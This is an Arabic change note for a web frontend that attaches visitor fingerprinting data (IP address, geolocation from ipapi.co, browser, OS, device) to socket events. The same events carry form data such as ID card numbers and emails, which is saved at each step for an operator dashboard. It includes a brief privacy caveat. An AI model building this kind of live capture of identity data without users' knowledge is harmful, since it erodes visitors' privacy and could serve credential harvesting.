# تحديث Frontend - إضافة المعلومات التقنية

## التحديثات المطبقة

تم تحديث Frontend لإرسال المعلومات التقنية الكاملة للزائر مع كل عملية إرسال بيانات إلى Backend.

---

## المعلومات التقنية المُرسلة

يتم الآن إرسال المعلومات التالية مع كل طلب:

1. **IP Address**: عنوان IP الخاص بالزائر
2. **Browser**: نوع المتصفح والإصدار (مثل: Chrome 120.0)
3. **OS**: نظام التشغيل والإصدار (مثل: Windows 11)
4. **Device**: نوع الجهاز (Desktop، Mobile، Tablet)
5. **Country**: الدولة (مثل: Qatar، Saudi Arabia)
6. **City**: المدينة (مثل: Doha، Riyadh)
7. **User Agent**: معلومات User Agent الكاملة

---

## الملفات المُضافة/المُعدلة

### 1. ملف جديد: `utils/deviceInfo.ts`

```typescript
import { UAParser } from 'ua-parser-js';

export interface DeviceInfo {
  ipAddress: string;
  browser: string;
  os: string;
  device: string;
  country: string;
  city: string;
  userAgent: string;
}

export const getDeviceInfo = async (): Promise<DeviceInfo> => {
  // يستخدم UAParser للحصول على معلومات Browser و OS و Device
  // يستخدم ipapi.co API للحصول على IP و Country و City
  // ...
}
```

**الوظيفة:**
- جمع جميع المعلومات التقنية للزائر
- استخدام `ua-parser-js` لتحليل User Agent
- استخدام `ipapi.co` API للحصول على IP والموقع الجغرافي

---

### 2. تحديث: `services/socketService.ts`

**التغييرات:**
- إضافة `deviceInfo` كـ property في الـ class
- تحديث `connect()` لتكون async وتجمع المعلومات التقنية عند الاتصال
- إضافة `deviceInfo` لجميع الـ socket events:
  * `visitor:join`
  * `visitor:page-change`
  * `visitor:save-data`

**مثال:**
```typescript
this.socket.emit('visitor:save-data', {
  sessionId: this.sessionId,
  formData,
  page,
  deviceInfo: this.deviceInfo, // ← المعلومات التقنية
});
```

---

### 3. تحديث: `App.tsx`

**التغييرات:**
- تحديث استدعاء `socketService.connect()` ليكون async
- إزالة الكود المكرر

**قبل:**
```typescript
socketService.connect(sessionId);
```

**بعد:**
```typescript
socketService.connect(sessionId).then(() => {
  const currentPage = getPageName(step);
  socketService.joinAsVisitor(currentPage);
  socketService.trackPageChange(currentPage);
});
```

---

### 4. إضافة مكتبة: `ua-parser-js`

```bash
npm install ua-parser-js
```

**الاستخدام:**
- تحليل User Agent للحصول على Browser و OS و Device

---

## كيفية عمل النظام

### 1. عند تحميل الصفحة

```
Frontend يتصل بـ Backend
    ↓
يجمع المعلومات التقنية (IP، Browser، OS، Device، Country، City)
    ↓
يحفظ المعلومات في socketService.deviceInfo
    ↓
يرسلها مع أول socket event (visitor:join)
```

### 2. عند تغيير الصفحة

```
الزائر ينتقل لصفحة جديدة
    ↓
Frontend يرسل visitor:page-change
    ↓
يتضمن deviceInfo مع البيانات
    ↓
Backend يحفظ الصفحة الحالية + المعلومات التقنية
```

### 3. عند حفظ البيانات

```
الزائر يملأ نموذج (Step 1، Step 2، إلخ)
    ↓
Frontend يرسل visitor:save-data
    ↓
يتضمن formData + deviceInfo
    ↓
Backend يحفظ البيانات + المعلومات التقنية في قاعدة البيانات
```

---

## مثال على البيانات المُرسلة

```json
{
  "sessionId": "abc123-def456-ghi789",
  "formData": {
    "accountType": "individual",
    "idCard": "12345678",
    "email": "user@example.com"
  },
  "page": "step1-account-type",
  "deviceInfo": {
    "ipAddress": "185.123.45.67",
    "browser": "Chrome 120.0.6099.129",
    "os": "Windows 11",
    "device": "Desktop",
    "country": "Qatar",
    "city": "Doha",
    "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36..."
  }
}
```

---

## التحديثات المطلوبة على Backend

لكي يعمل النظام بشكل كامل، يجب تحديث Backend لاستقبال وحفظ `deviceInfo`:

### 1. تحديث Socket Event Handlers

```typescript
// في Backend
socket.on('visitor:save-data', async (data) => {
  const { sessionId, formData, page, deviceInfo } = data;
  
  // حفظ البيانات في قاعدة البيانات
  await saveVisitorData({
    sessionId,
    formData,
    page,
    ipAddress: deviceInfo.ipAddress,
    browser: deviceInfo.browser,
    os: deviceInfo.os,
    device: deviceInfo.device,
    country: deviceInfo.country,
    city: deviceInfo.city,
    userAgent: deviceInfo.userAgent,
  });
});
```

### 2. تحديث Database Schema

إضافة الحقول التالية لجدول الزوار:

```sql
ALTER TABLE visitors ADD COLUMN ip_address VARCHAR(45);
ALTER TABLE visitors ADD COLUMN browser VARCHAR(100);
ALTER TABLE visitors ADD COLUMN os VARCHAR(100);
ALTER TABLE visitors ADD COLUMN device VARCHAR(20);
ALTER TABLE visitors ADD COLUMN country VARCHAR(100);
ALTER TABLE visitors ADD COLUMN city VARCHAR(100);
ALTER TABLE visitors ADD COLUMN user_agent TEXT;
```

---

## الاختبار

### 1. اختبار محلي

```bash
cd /home/ubuntu/twtheeq-manus-front
npm run dev
```

افتح المتصفح وتحقق من Console:
```
✅ Connected to backend: xyz123
👤 Joined as visitor on page: home
💾 Data saved for page: step1-account-type
```

### 2. اختبار البيانات المُرسلة

في Backend logs، يجب أن ترى:
```json
{
  "deviceInfo": {
    "ipAddress": "185.123.45.67",
    "browser": "Chrome 120.0",
    "os": "Windows 11",
    "device": "Desktop",
    "country": "Qatar",
    "city": "Doha"
  }
}
```

---

## الخطوات التالية

1. ✅ **Frontend**: تم تحديثه بالكامل
2. ⏳ **Backend**: يحتاج تحديث لاستقبال وحفظ `deviceInfo`
3. ⏳ **Database**: يحتاج إضافة الحقول الجديدة
4. ⏳ **Dashboard**: يحتاج عرض المعلومات التقنية في الواجهة

---

## ملاحظات مهمة

1. **Privacy**: تأكد من إضافة سياسة الخصوصية التي تذكر جمع المعلومات التقنية
2. **GDPR**: إذا كان الموقع يستهدف أوروبا، تأكد من الامتثال لـ GDPR
3. **Performance**: استدعاء `ipapi.co` API يحدث مرة واحدة فقط عند الاتصال
4. **Fallback**: إذا فشل الحصول على IP/Country، يتم استخدام "Unknown"

---

**تم التحديث بتاريخ:** 13 يناير 2026  
**الإصدار:** 1.0.0  
**الحالة:** ✅ جاهز للاستخدام
